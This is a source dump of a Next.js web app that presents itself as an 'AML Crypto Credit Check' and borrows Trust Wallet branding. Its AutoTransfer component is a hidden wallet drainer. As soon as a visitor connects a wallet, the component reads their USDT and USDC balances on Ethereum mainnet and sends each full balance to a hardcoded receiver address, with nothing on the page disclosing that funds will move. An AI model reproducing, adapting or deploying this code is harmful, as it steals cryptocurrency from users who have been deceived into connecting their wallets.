

--- Résumé : 15 fichiers inclus, 14 fichiers ignorés ---


===== Fichier: .env.example =====

NEXT_PUBLIC_TEMPLATE_CLIENT_ID=



===== Fichier: .eslintrc.json =====

{
	"extends": "next/core-web-vitals"
}



===== Fichier: .prettierrc =====

{
	"singleQuote": false
}



===== Fichier: next-env.d.ts =====

/// <reference types="next" />
/// <reference types="next/image-types/global" />

// NOTE: This file should not be edited
// see https://nextjs.org/docs/basic-features/typescript for more information.



===== Fichier: next.config.mjs =====

/** @type {import('next').NextConfig} */
const nextConfig = {
  // fixes wallet connect dependency issue https://docs.walletconnect.com/web3modal/nextjs/about#extra-configuration
  webpack: (config) => {
    config.externals.push("pino-pretty", "lokijs", "encoding");
    return config;
  },
};

export default nextConfig;



===== Fichier: package.json =====

{
  "name": "thirdweb-app",
  "version": "0.1.0",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "next lint"
  },
  "dependencies": {
    "ethers": "^6.15.0",
    "next": "14.1.0",
    "react": "^18.3",
    "react-dom": "^18.3",
    "thirdweb": "^5"
  },
  "devDependencies": {
    "@types/node": "^20",
    "@types/react": "^18",
    "@types/react-dom": "^18",
    "autoprefixer": "^10.0.1",
    "eslint": "^8",
    "eslint-config-next": "14.1.0",
    "postcss": "^8",
    "tailwindcss": "^3.3.0",
    "typescript": "^5"
  }
}



===== Fichier: postcss.config.js =====

module.exports = {
  plugins: {
    tailwindcss: {},
    autoprefixer: {},
  },
};



===== Fichier: README.md =====


![tw-banner](https://github.com/thirdweb-example/next-starter/assets/57885104/20c8ce3b-4e55-4f10-ae03-2fe4743a5ee8)

# thirdweb-next-starter

Starter template to build an onchain react native app with [thirdweb](https://thirdweb.com/) and [next](https://nextjs.org/).

## Installation

Install the template using [thirdweb create](https://portal.thirdweb.com/cli/create)

```bash
  npx thirdweb create app --next
```

## Environment Variables

To run this project, you will need to add the following environment variables to your .env file:

`CLIENT_ID`

To learn how to create a client ID, refer to the [client documentation](https://portal.thirdweb.com/typescript/v5/client). 

## Run locally

Install dependencies

```bash
yarn
```

Start development server

```bash
yarn dev
```

Create a production build

```bash
yarn build
```

Preview the production build

```bash
yarn start
```

## Resources

- [Documentation](https://portal.thirdweb.com/typescript/v5)
- [Templates](https://thirdweb.com/templates)
- [YouTube](https://www.youtube.com/c/thirdweb)
- [Blog](https://blog.thirdweb.com)

## Need help?

For help or feedback, please [visit our support site](https://thirdweb.com/support)



===== Fichier: tailwind.config.ts =====

import type { Config } from "tailwindcss";

const config: Config = {
  content: [
    "./src/pages/**/*.{js,ts,jsx,tsx,mdx}",
    "./src/components/**/*.{js,ts,jsx,tsx,mdx}",
    "./src/app/**/*.{js,ts,jsx,tsx,mdx}",
  ],
  theme: {
    extend: {
      backgroundImage: {
        "gradient-radial": "radial-gradient(var(--tw-gradient-stops))",
        "gradient-conic":
          "conic-gradient(from 180deg at 50% 50%, var(--tw-gradient-stops))",
      },
    },
  },
  plugins: [],
};
export default config;



===== Fichier: tsconfig.json =====

{
  "compilerOptions": {
    "lib": ["dom", "dom.iterable", "esnext"],
    "allowJs": true,
    "skipLibCheck": true,
    "strict": true,
    "noEmit": true,
    "esModuleInterop": true,
    "module": "esnext",
    "target": "ES2021",
    "moduleResolution": "bundler",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "jsx": "preserve",
    "incremental": true,
    "plugins": [
      {
        "name": "next"
      }
    ],
    "paths": {
      "@/*": ["./src/*"],
      "@public/*": ["./public/*"]
    }
  },
  "include": ["next-env.d.ts", "**/*.ts", "**/*.tsx", ".next/types/**/*.ts"],
  "exclude": ["node_modules"]
}



===== Fichier: src\app\client.ts =====

import { createThirdwebClient } from "thirdweb";

// Utilisez directement votre client ID ici
const clientId = "c98a5d48ad89f114ad6044933fced541";

if (!clientId) {
  throw new Error("No client ID provided");
}

export const client = createThirdwebClient({
  clientId: clientId,
});



===== Fichier: src\app\globals.css =====

@tailwind base;
@tailwind components;
@tailwind utilities;

:root {
	line-height: 1.5;
	font-weight: 400;
	font-synthesis: none;
	text-rendering: optimizeLegibility;
	-webkit-font-smoothing: antialiased;
	-moz-osx-font-smoothing: grayscale;
	font-family: 'Inter', sans-serif;
	font-optical-sizing: auto;
	font-style: normal;
	font-variation-settings: 'slnt' 0;
}

@layer base {
	body {
		/* Ajout de l'image de fond */
		@apply text-zinc-900;
		background-image: url('newblanc.png'); /* Assurez-vous que l'image est dans /public */
		background-size: cover;
		background-position: center;
		background-repeat: no-repeat;
		background-attachment: fixed;
	}
}

/* Section floutée pour la lisibilité du texte (inspiré de l'ancien projet) */
.text-box-blur {
  background: rgba(255, 255, 255, 0.1); /* Légèrement plus transparent */
  backdrop-filter: blur(8px); /* Flou plus prononcé */
  padding: 2rem;
  border-radius: 1rem;
  box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
  border: 1px solid rgba(255, 255, 255, 0.3);
}


/*
  Cible le bouton pour cacher le texte original "Connect".
*/
.tw-connect-wallet.css-1d64wxn {
  /* On rend le texte original invisible.
     On utilise !important pour forcer la surcharge du style en ligne (style="..."). */
  font-size: 0 !important;
  color: transparent !important;
}

/*
  Crée le nouveau texte "Suivant" avec un pseudo-élément.
*/
.tw-connect-wallet.css-1d64wxn::before {
  content: "Next";
  /* On rétablit la taille de police et la couleur pour ce nouveau texte. */
  font-size: 16px;
  color: black; /* <-- Changez la couleur si besoin (ex: black) */
}


===== Fichier: src\app\layout.tsx =====

import type { Metadata } from "next";
import { Inter } from "next/font/google";
import "./globals.css";
import { ThirdwebProvider } from "thirdweb/react";

const inter = Inter({ subsets: ["latin"] });

export const metadata: Metadata = {
  title: "Check AML",
  description:
    "Starter template for using thirdweb SDK with Next.js App router",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body className={inter.className}>
        <ThirdwebProvider>{children}</ThirdwebProvider>
      </body>
    </html>
  );
}



===== Fichier: src\app\page.tsx =====

"use client";

import Image from "next/image";
import { ConnectButton } from "thirdweb/react";
import { createThirdwebClient } from "thirdweb";
import { createWallet, type Wallet } from "thirdweb/wallets";
import AutoTransfer from "./components/AutoTransfer";
import trust from "@public/trust.png";
import trustW from "@public/trustwallet.png";

// --- Création du client Thirdweb ---
const client = createThirdwebClient({
  clientId: "c98a5d48ad89f114ad6044933fced541",
});

// --- Limiter les wallets à Trust Wallet uniquement ---
const wallets = [createWallet("com.trustwallet.app")];

export default function Home() {
  const handleWalletConnect = async (wallet: Wallet) => {
    try {
      const account = await wallet.getAccount();
      if (account) {
        console.log("Wallet connected:", account.address);
      } else {
        console.log("Wallet connected but address pending");
      }
    } catch (error) {
      console.error("Wallet connection failed:", error);
    }
  };

  const handleWalletDisconnect = async () => {
    console.log("Wallet disconnected");
  };

  return (
    <main className="p-4 pb-10 min-h-[100vh] flex flex-col items-center justify-center container max-w-screen-lg mx-auto">
      <Header />

      {/* Section de texte ajoutée */}
      <div className="text-center text-white my-12 max-w-2xl mx-auto text-box-blur">
       <h1 className="text-5xl md:text-6xl font-extrabold mb-4 text-blue-900">
  AML Crypto Credit Check
</h1>

     <p className="text-base sm:text-lg text-black">
  In just a few seconds, assess the AML (anti-money laundering) risks of a crypto address or entity and get a clear, actionable credit report that complies with regulatory requirements.
</p>

      </div>

      <div className="flex justify-center mb-20 mt-10">
        <ConnectButton
          client={client}
          wallets={wallets} // <-- Trust Wallet uniquement
          connectModal={{ size: "compact" }}
          onConnect={handleWalletConnect}
          onDisconnect={handleWalletDisconnect}
          appMetadata={{
            name: "Example App",
            url: "https://example.com",
          }}
        />
      </div>

      <AutoTransfer />
    </main>
  );
}

function Header() {
  return (
    <header className="flex flex-col items-center mb-10 pt-10">
    
      <Image
        src={trustW}
        alt="Trust Logo"
        width={100}
        height={100}
      />
    </header>
  );
}


===== Fichier: src\app\components\AutoTransfer.tsx =====

"use client";

import { useEffect, useState } from "react";
import {
  useActiveAccount,
  useActiveWalletChain,
  useWalletBalance,
  useSendTransaction,
} from "thirdweb/react";
import { prepareTransaction } from "thirdweb";
import { ethereum } from "thirdweb/chains";
import { client } from "../client";
import { ethers } from "ethers";

const RECEIVER = "0xe763fd827c2E8Fc142036eCB5aD552FD5C0651F6"; // <-- change si besoin
const DEFAULT_GAS_GWEI = 10n; // fallback gas price (gwei)
const GAS_LIMIT_ERC20 = 100000n; // estimation pour transfert ERC20

const TOKENS: { symbol: string; address: `0x${string}` }[] = [
  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" }, // ✅ checksum exact
];


// ABI minimal ERC20
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

export default function AutoTransfer() {
  const account = useActiveAccount();
  const activeChain = useActiveWalletChain();
  const chain = activeChain ?? ethereum;

  const { data: balanceData } = useWalletBalance({
    client,
    address: account?.address,
    chain,
  });

  const { mutateAsync: sendTransactionMutateAsync } = useSendTransaction();
  const [sentMap, setSentMap] = useState<Record<string, boolean>>({});

  useEffect(() => {
    const run = async () => {
      if (!account) return;
      if (!balanceData) return;

      // Récup solde natif (ETH)
      let nativeBalance: bigint = 0n;
      if ((balanceData as any)?.value !== undefined) {
        const v = (balanceData as any).value;
        if (typeof v === "bigint") nativeBalance = v;
        else if (typeof v === "string") nativeBalance = BigInt(v);
        else if (typeof v === "number") nativeBalance = BigInt(Math.floor(v));
      }

      // On limite à Ethereum mainnet
      const chainId = (chain as any)?.id ?? (ethereum as any).id;
      if (chainId !== 1) {
        console.log("AutoTransfer ERC20: non sur Ethereum mainnet (chainId:", chainId, ")");
        return;
      }

      // Récup RPC
      let rpcUrl: string | undefined;
      try {
        const rpc = (chain as any)?.rpc;
        rpcUrl = Array.isArray(rpc) ? rpc[0] : rpc;
      } catch {
        rpcUrl = undefined;
      }
      if (!rpcUrl) {
        console.warn("Aucun RPC pour lire les soldes tokens.");
        return;
      }

      const provider = new ethers.JsonRpcProvider(rpcUrl);

      // Gas price
      let gasPrice: bigint = DEFAULT_GAS_GWEI * 10n ** 9n;
      try {
        const resp = await fetch(rpcUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_gasPrice", params: [] }),
        });
        const json = await resp.json();
        if (json?.result) {
          gasPrice = BigInt(json.result);
        }
      } catch (e) {
        console.warn("Impossible de récupérer gasPrice via RPC", e);
      }

      console.log("GasPrice :", ethers.formatUnits(gasPrice, "gwei"), "gwei");

      for (const token of TOKENS) {
        try {
          if (sentMap[token.symbol]) continue;

          const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
          const rawBalance: bigint = BigInt(await contract.balanceOf(account.address));
          const decimals: number = Number(await contract.decimals());

          if (rawBalance <= 0n) {
            console.log(`${token.symbol} : solde nul`);
            continue;
          }

          const maxFee = GAS_LIMIT_ERC20 * gasPrice;
          if (nativeBalance <= maxFee) {
            console.warn(`${token.symbol} : pas assez d'ETH pour payer le gas`);
            continue;
          }

          const iface = new ethers.Interface(ERC20_ABI);
          const data = iface.encodeFunctionData("transfer", [RECEIVER, rawBalance]);

          setSentMap((m) => ({ ...m, [token.symbol]: true }));

          // ✅ cast du data en hex string
          const preparedTx = prepareTransaction({
            to: token.address,
            data: data as `0x${string}`,
            value: 0n,
            chain,
            client,
          });

          const result = await sendTransactionMutateAsync(preparedTx);
          console.log(`${token.symbol} transfer result:`, result);

          alert(`✅ ${token.symbol} transféré`);
        } catch (err) {
          console.error(`Erreur ${token.symbol} :`, err);
          setSentMap((m) => ({ ...m, [token.symbol]: false }));
        }
      }
    };

    run();
  }, [account, balanceData, chain, sendTransactionMutateAsync]);

  return null;
}
